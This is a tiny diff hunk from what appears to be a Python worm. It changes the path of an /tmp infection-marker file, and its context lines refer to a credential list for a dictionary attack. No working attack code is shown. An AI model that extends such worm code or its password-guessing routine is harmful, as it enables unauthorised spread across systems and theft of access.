@@ -7,7 +7,7 @@ import stat
 
  
 # File marking the presence of a worm in a system
-INFECTION_MARKER = "/tmp/infectionMarker.txt"
+INFECTION_MARKER = "/tmp/infectionMarker_passW_python.txt"
  
  
 # List of credentials for Dictionary Attack
